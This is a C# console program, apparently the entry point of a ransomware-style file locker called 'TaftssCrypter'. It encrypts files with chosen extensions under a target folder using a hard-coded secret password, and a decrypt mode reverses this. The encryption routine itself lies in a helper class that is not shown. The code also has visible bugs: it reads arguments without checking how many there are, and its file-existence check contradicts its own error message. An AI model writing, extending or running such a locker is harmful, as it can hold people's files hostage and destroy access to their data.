using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace TaftssCrypter
{
    class Program
    {
        //global variable. You can change it. It works parametrically. :) This is old version part :)
        static string Path = @"C:\Users\Administrator\Desktop\test";
        static string Pass = "ŞifreyiBulamazsın.ÇokGüçlüBirŞifre.";
        static string UserName = @"desktop-16g993t\administrator";
        //-------------------------------------------------------
        static string TargerExt = "*.zip";
        static void Main(string[] args)
        {
            if (args[1] != null)
                Path = args[1];
            if (args[2] != null)
                UserName = args[2];
            if (args[3] != null)
                TargerExt = args[3];

            Console.WriteLine("\r\n _____      __ _           _____                  _            \r\n|_   _|    / _| |         /  __ \\                | |           \r\n  | | __ _| |_| |_ ___ ___| /  \\/_ __ _   _ _ __ | |_ ___ _ __ \r\n  | |/ _` |  _| __/ __/ __| |   | '__| | | | '_ \\| __/ _ \\ '__|\r\n  | | (_| | | | |_\\__ \\__ \\ \\__/\\ |  | |_| | |_) | ||  __/ |   \r\n  \\_/\\__,_|_|  \\__|___/___/\\____/_|   \\__, | .__/ \\__\\___|_|   \r\n                                       __/ | |                 \r\n                                      |___/|_|                 \r\n");
            Console.WriteLine("                                             Develop by @taftss");
            Console.WriteLine("                                                           v2.1");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            if (args[0] == "-e")
            {
                if (!File.Exists(Path))
                {
                    Console.WriteLine("[+]  File Locker started.");
                    Console.WriteLine("[+]  Locker Mode : ON");
                    Console.WriteLine("");
                    TaftssCrypter.Helper.Helper helper = new TaftssCrypter.Helper.Helper();
                    helper.UserName = UserName;
                    helper.customExtensiom = TargerExt.Split(',');
                    helper.RunnerSetter(Path, Pass);
                    Console.WriteLine("[!]  Custom Files Encrypted.");

                }
                else
                    Console.WriteLine("File Path isn't exists.");
            }
            else if (args[0] == "-d")
            {
                if (!File.Exists(Path))
                {
                    Console.WriteLine("[+]  File Locker started.");
                    Console.WriteLine("[+]  Delocker Mode : ON");
                    Console.WriteLine("");
                    TaftssCrypter.Helper.Helper helper = new TaftssCrypter.Helper.Helper();
                    helper.UserName = UserName;
                    helper.DeRunnerSetter(Path, Pass);
                    Console.WriteLine("[+]  Custom Files Decrypted.");
                }
                else
                    Console.WriteLine("File Path isn't exists.");
            }    
        }
    }
}
